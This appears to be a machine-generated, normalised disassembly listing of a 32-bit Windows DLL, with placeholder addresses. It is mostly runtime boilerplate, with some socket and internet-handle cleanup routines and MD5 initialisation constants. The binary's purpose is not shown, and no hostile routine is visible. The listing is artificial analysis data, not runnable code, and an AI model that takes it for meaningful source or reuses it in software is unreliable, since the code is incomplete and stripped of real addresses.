mov ebx ecx
push eax
call sub_100142be
mov eax ebx
pop ebx
pop ecx
retn
sub_10014705
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_100148c1
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001d9b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10014b58
push esi
mov esi ecx
call sub_10014b74
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100150b1
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_1000264e
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
retn
jmp sub_1000af0a
sub_100150de
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0xc
push eax
call sub_100025cf
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10015618
push edi
lea ecx [ esi + 0x4 ]
mov [ esi ] edi
call sub_10015631
push edi
push edi
push esi
call sub_1000d3de
add esp 0xc
mov eax esi
retn
sub_10015677
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_1002ae74
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_100156ee
mov [ ecx ] r--data
retn
sub_10015974
mov [ ecx ] r--data
jmp sub_10016c58
sub_10016725
xor eax eax
cmp [ esp + 0x8 ] eax
je r-xdata
retn
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
call sub_10006f10
sub_1001673c
push esi
mov esi ecx
call sub_10016758
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10016758
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005f78
mov [ esi ] r--data
pop esi
retn
sub_1001676e
mov al [ ecx + 0xc ]
retn
sub_10016772
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001ebc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1001678c
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001ebc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100167a6
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001ebc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10016888
mov ecx [ ebp - 0x14 ]
call sub_10005f78
xor ebx ebx
push ebx
push ebx
call sub_1002ae74
int3
sub_10016a9f
push esi
mov esi ecx
call sub_10016abb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10016b1a
mov eax r-xdata
retn
sub_10016b62
xor eax eax
inc eax
retn
sub_10016b66
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002fe41
retn 0x4
sub_10016bb4
push [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
call [ eax + 0xc ]
retn
sub_10016bcb
mov [ esi + 0x11 ] 0x1
mov eax [ esi + 0x14 ]
call sub_1002fe41
retn 0x4
sub_10016c36
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10016c58
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10016f34
push esi
mov esi ecx
call sub_10016f50
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100170d3
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_1002ae74
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_100172b3
push 0x0
push [ esp + 0x8 ]
lea ecx [ esi + 0x4 ]
call sub_10005cd0
mov [ esi ] r--data
mov eax esi
retn 0x4
sub_100172cc
push esi
mov esi ecx
call sub_10017303
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100172e8
push [ esp + 0x8 ]
lea ecx [ esi + 0x4 ]
push [ esp + 0x8 ]
call sub_1000dd07
mov [ esi ] r--data
mov eax esi
retn 0x8
sub_10017303
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_100020e2
retn
sub_100175b6
push esi
mov esi ecx
call sub_100175d2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10017910
cmp [ eax + 0x10 ] 0x8
jbe r-xdata
retn
mov eax [ eax ]
test eax eax
je r-xdata
push eax
call sub_10027c56
pop ecx
j_sub_10017910
jmp sub_10017910
j_sub_10017cc8
jmp sub_10017cc8
sub_10018237
mov esi [ ebp + 0x8 ]
call sub_100015ca
push 0x0
push 0x0
call sub_1002ae74
int3
sub_100185b4
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_100185e1
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_10018628
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001db8
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10018640
push esi
mov esi ecx
call sub_10018693
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1001865c
push esi
mov esi ecx
call sub_10018678
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10018678
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ad89
mov ecx esi
jmp sub_10001d9b
sub_10018693
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_10018678
pop esi
retn
sub_100186f2
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_100185b4
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_1002ae74
int3
sub_100189bf
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10018b5b
mov eax [ ebp + 0x8 ]
pop ecx
leave
retn 0x4
sub_10018b5b
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10018b70
mov eax [ ebp + 0x8 ]
leave
retn
sub_10018b70
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0x20
call sub_10018b8a
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10018b8a
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push esi
mov esi ecx
call sub_10018c1b
mov eax esi
pop esi
pop ecx
pop ecx
retn
sub_10018f10
sub ecx 0x28
jmp sub_1001865c
sub_10018f18
sub ecx 0x3c
jmp sub_10018640
sub_10018f20
sub ecx 0x28
jmp sub_10018640
sub_10018f28
xor al al
retn
j_sub_10001d9b
jmp sub_10001d9b
sub_10018f30
push esi
mov esi ecx
call sub_10001d9b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100190ac
push esi
mov esi ecx
call sub_100190c8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100190c8
mov [ ecx ] r--data
mov ecx [ ecx + 0x194 ]
cmp ecx 0xffffffff
je r-xdata
jmp [ WSACleanup@IAT ]
push ecx
call [ closesocket@IAT ]
sub_10019230
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100195e8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100192c5
mov [ ecx ] r--data
jmp sub_100195e8
sub_100192d0
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100195e8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100192f2
mov [ ecx ] r--data
jmp sub_100195e8
sub_1001937b
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100195e8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1001939d
mov [ ecx ] r--data
jmp sub_100195e8
sub_100195cc
push esi
mov esi ecx
call sub_100195e8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100195e8
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InternetCloseHandle@IAT ]
and [ esi + 0x4 ] 0x0
sub_10019605
push r--data
mov ecx esi
call sub_1000c634
test eax eax
jne r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
retn
lea eax [ esi + 0x4 ]
retn
mov eax [ esi + 0x4 ]
retn
sub_10019724
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call sub_1002a4a4
pop ecx
retn
sub_10019735
cmp [ esp + 0x8 ] 0x0
je r-xdata
retn
push [ esp + 0x8 ]
call sub_10027a85
pop ecx
sub_100200a1
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100200be
mov [ ecx ] r--data
retn
sub_100203c9
push esi
mov esi ecx
call sub_100203e5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100203e5
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov ecx esi
pop esi
jmp sub_10016abb
push eax
call [ DestroyWindow@IAT ]
sub_10020938
and [ eax + 0x14 ] 0x0
and [ eax + 0x10 ] 0x0
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn
sub_10021990
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn
mov edx [ ecx ]
mov [ eax ] edx
add eax 0x4
add ecx 0x4
dec [ esp + 0x4 ]
jne r-xdata
sub_100219a8
dec eax
inc eax
retn
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x4 ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
sub_10021b8f
push esi
mov esi ecx
call sub_10021bab
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10021cad
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_1002ae74
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
j_sub_1002b64c
jmp sub_1002b64c
sub_10021d53
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_10022fdc
push [ esi ]
call sub_100272e8
pop ecx
pop ecx
pop esi
retn
sub_10021d6a
push [ ecx ]
call sub_10022fec
pop ecx
retn
sub_10021d73
push [ ecx ]
call sub_10022ffc
pop ecx
retn
sub_10021f1f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1002c1a3
pop ecx
test eax eax
je r-xdata
pop ebp
retn
pop ebp
jmp sub_1002c1f8
sub_10021f39
mov ecx [ ecx + 0x4 ]
call sub_10007d82
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10021fbc
mov eax [ rw-data ]
retn
sub_10022358
mov edi edi
push esi
call sub_1002d957
mov esi [ eax + 0x8 ]
call sub_1002d90b
mov edx eax
mov eax esi
pop esi
retn
sub_100225f8
push r-xdata
call sub_1002c1a3
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_10022dec
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10022d83
sub_10022df7
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1002738b
sub_10022fcc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_10022fdc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_10022fec
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_10022ffc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10023032
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ rw-data ] eax
test ecx ecx
je r-xdata
retn
cmp eax 0xa
jb r-xdata
call [ eax * 4 + rw-data ]
sub_100230a0
xor eax eax
retn 0x4
sub_10023120
mov eax [ ecx ]
push eax
call sub_10027c56
pop ecx
retn
sub_10023130
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
add esp 0x4
sub_10023310
push esi
mov esi ecx
call sub_10023280
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
add esp 0x4
sub_10023570
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_100233a0
push esi
call sub_100272e8
add esp 0x4
sub_10023654
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x24 ] 0x10
jb r-xdata
add eax 0x10
mov [ ebp - 0x14 ] eax
mov edx [ eax + 0x10 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax sub_10023671
retn
sub_10023671
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100236a0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push 0xffffffff
push 0x0
push eax
call sub_1000253c
retn
sub_10023aa9
mov edx [ ebp + 0x8 ]
push edx
call sub_10023570
add esp 0x4
push 0x0
push 0x0
call sub_1002ae74
int3
sub_10023ac0
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_100233a0
push esi
call sub_100272e8
add esp 0x4
sub_10023f99
mov ecx [ ebp - 0x14 ]
call sub_10023590
mov [ ebp - 0x14 ] eax
mov eax sub_10023faa
retn
sub_10023faa
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10024076
mov ecx [ ebp - 0x14 ]
add ecx 0x4c
call sub_10023150
mov eax r-xdata
retn
sub_10024b50
xor al al
retn
sub_10024b60
mov eax 0x5
retn
sub_10025050
push esi
push 0xffffffff
mov esi ecx
call sub_10024f80
push eax
mov ecx esi
call sub_100022bb
mov eax esi
pop esi
retn
sub_10025740
xor eax eax
retn
sub_10025750
xor eax eax
retn 0x10
sub_10025760
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
add esp 0x4
sub_10026470
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
add esp 0x4
sub_10026490
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
retn 0x8
sub_100264e0
mov eax [ esp + 0x4 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
retn 0x8
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax 0x1
retn 0x8
sub_10026500
mov eax r--data
retn
sub_10026640
mov eax [ ecx ]
push eax
call [ LocalFree@IAT ]
retn
sub_10026650
mov eax r--data
retn
sub_10026660
mov eax r--data
retn
sub_100272e8
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10027a85
sub_10027370
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_10027454
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_100273f0
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_10027454
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_100274ce
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_10027a85
pop ecx
sub_100274e4
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_1002750f
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10027471
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002752c
mov [ ecx ] r--data
jmp sub_100274ce
sub_1002757f
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_1002e8e4
pop ecx
retn
sub_100276ca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10027a3f
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_1002fdd9
pop ecx
pop ecx
retn
sub_10027adb
push 0x4
call sub_10030124
pop ecx
retn
sub_10027b31
call sub_1002f139
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1002c605
sub_100296ca
push esi
call sub_1002a6b8
pop ecx
retn
sub_100298ac
push [ ebp + 0x14 ]
call sub_1002a6b8
pop ecx
retn
sub_10029a0f
push [ ebp + 0xc ]
call sub_1002a6b8
pop ecx
retn
sub_10029b15
push esi
call sub_1002a6b8
pop ecx
retn
sub_10029c22
push [ ebp + 0x8 ]
call sub_1002a6b8
pop ecx
retn
sub_10029dd3
push [ ebp + 0x8 ]
call sub_1002a6b8
pop ecx
retn
sub_10029f2f
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1002a6f4
pop ecx
pop ecx
retn
sub_10029f5e
push 0x1
call sub_10030124
pop ecx
retn
sub_10029fb0
push [ ebp + 0x8 ]
call sub_1002a6b8
pop ecx
retn
sub_10029fba
push 0x1
call sub_10029e8d
pop ecx
retn
sub_1002a0ae
push esi
call sub_1002a6b8
pop ecx
retn
sub_1002a0b6
mov edi edi
push ebp
mov ebp esp
call sub_1002f139
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_1002a0c8
call sub_1002f139
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_1002a49b
push 0x4
call sub_10030124
pop ecx
retn
sub_1002a625
call sub_10029fba
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10027a85
pop ecx
retn
call sub_10033450
sub_1002a835
push [ ebp + 0x8 ]
call sub_1002a6b8
pop ecx
retn
sub_1002abcf
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1002aba4
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_1002abe7
push 0x8
call sub_100301fe
pop ecx
retn
sub_1002abf0
push 0x8
call sub_10030124
pop ecx
retn
sub_1002add6
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10030124
pop ecx
sub_1002adeb
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1002acbf
add esp 0xc
pop ebp
retn
sub_1002ae01
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1002acbf
add esp 0xc
pop ebp
retn
sub_1002ae17
push 0x1
push 0x0
push 0x0
call sub_1002acbf
add esp 0xc
retn
sub_1002b37e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1002b392
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10027150
jmp sub_1002b37e
sub_1002b3a1
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10027150
jmp sub_1002b37e
sub_1002b3ce
mov [ ecx ] r--data
jmp sub_100274ce
sub_1002b52a
push [ ebp - 0x14 ]
call sub_1002b45f
pop ecx
retn
sub_1002b56e
call sub_1002f139
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1002f139
add eax 0x90
dec [ eax ]
sub_1002b611
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1002b61a
mov esp [ ebp - 0x18 ]
call sub_1003481d
sub_1002b64c
call sub_1002f139
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne cl
mov al cl
retn
sub_1002b6da
push 0x4
mov eax sub_1004eaf1
call sub_1002b2d9
call sub_1002f139
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10034856
call sub_10034869
sub_1002b7b3
mov eax [ ebp - 0x14 ]
call sub_1002b589
retn
sub_1002ba2a
xor eax eax
inc eax
retn
sub_1002ba2e
mov esp [ ebp - 0x18 ]
call sub_1003481d
sub_1002bac3
xor eax eax
inc eax
retn
sub_1002bac7
mov esp [ ebp - 0x18 ]
call sub_1003481d
sub_1002bf79
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10027471
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002c19d
call sub_1002abf0
retn
sub_1002c1a3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1002c167
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_1002c66f
push 0xc
call sub_10030124
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1002c77b
push 0xd
call sub_10030124
pop ecx
retn
sub_1002c787
push 0xc
call sub_10030124
pop ecx
retn
sub_1002c790
xor eax eax
retn
sub_1002d457
push 0xc
call sub_10030124
pop ecx
retn
sub_1002d463
push 0xc
call sub_10030124
pop ecx
retn
sub_1002d494
and [ esi + 0x70 ] 0xffffffef
retn
sub_1002d8c6
call sub_1002f139
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1002c605
sub_1002d8ef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_1002d8c6
sub_1002d90b
call sub_1002f139
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1002c605
sub_1002d957
call sub_1002f139
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1002c605
sub_1002dd87
call sub_1002f139
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1002c605
sub_1002e344
mov eax sub_10038548
mov [ rw-data ] eax
mov [ rw-data ] sub_10037c2f
mov [ rw-data ] sub_10037be3
mov [ rw-data ] sub_10037c1c
mov [ rw-data ] sub_10037b85
mov [ rw-data ] eax
mov [ rw-data ] sub_100384c0
mov [ rw-data ] sub_10037ba1
mov [ rw-data ] sub_10037b03
mov [ rw-data ] sub_10037a90
retn
sub_1002e3a4
mov edi edi
push ebp
mov ebp esp
call sub_1002e344
call sub_100385d4
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_1003856b
sub_1002e4e6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002e3c7
add esp 0xc
pop ebp
retn
sub_1002e5b9
push [ ebp + 0x8 ]
call sub_1002a6b8
pop ecx
retn
sub_1002e845
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1002e94b
push 0xe
call sub_10030124
pop ecx
retn
sub_1002edab
push 0xc
push r--data
call sub_1002fdfc
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
sub_1002edc8
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1002ee5d
call sub_1002edfb
mov [ rw-data ] eax
xor eax eax
retn
sub_1002ee6a
and [ rw-data ] 0x0
retn
sub_1002eee4
push 0x0
call sub_1002ee72
pop ecx
retn
sub_1002ef5f
call [ TlsAlloc@IAT ]
retn 0x4
sub_1002f0ae
push 0xd
call sub_10030124
pop ecx
retn
sub_1002f0b7
push 0xc
call sub_10030124
pop ecx
retn
sub_1002f26d
push 0xd
call sub_10030124
pop ecx
retn
sub_1002f279
push 0xc
call sub_10030124
pop ecx
retn
sub_1002f6ba
xor eax eax
inc eax
retn
sub_1002fe41
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10030124
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100301f5
push 0xa
call sub_10030124
pop ecx
retn
sub_10031f01
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1003277e
push [ ebp + 0x8 ]
call sub_1003a108
pop ecx
retn
sub_10032a43
push [ ebp + 0x8 ]
call sub_1003a108
pop ecx
retn
sub_10032f76
push [ ebp + 0x8 ]
call sub_1002a6b8
pop ecx
retn
sub_10033061
push [ ebp + 0x8 ]
call sub_1002a6b8
pop ecx
retn
sub_10033173
push [ ebp + 0x8 ]
call sub_1003a108
pop ecx
retn
sub_100332dc
push [ ebp + 0x8 ]
call sub_1003a108
pop ecx
retn
sub_100334e6
push 0x1
call sub_10030124
pop ecx
retn
sub_1003361e
push 0x1
call sub_10030124
pop ecx
retn
sub_100336fe
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10033628
add esp 0xc
pop ebp
retn 0x4
sub_10033731
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1003a3e1
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10033764
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10033628
add esp 0xc
pop ebp
retn 0x8
sub_10033e30
push [ ebp + 0x8 ]
call sub_1003a108
pop ecx
retn
sub_100341cb
push 0xd
call sub_10030124
pop ecx
retn
sub_10034596
push 0xd
call sub_10030124
pop ecx
retn
sub_100345cf
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_10034435
pop ecx
mov [ rw-data ] 0x1
sub_100347eb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_1003481d
push 0x8
push r--data
call sub_1002fdfc
call sub_1002f139
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1002c1f8
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1003483d
xor eax eax
inc eax
retn
sub_10034856
call sub_1002f139
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_1003481d
call eax
sub_1003488d
xor eax eax
inc eax
retn
sub_100348a1
push sub_1003481d
call sub_1002ee72
pop ecx
mov [ rw-data ] eax
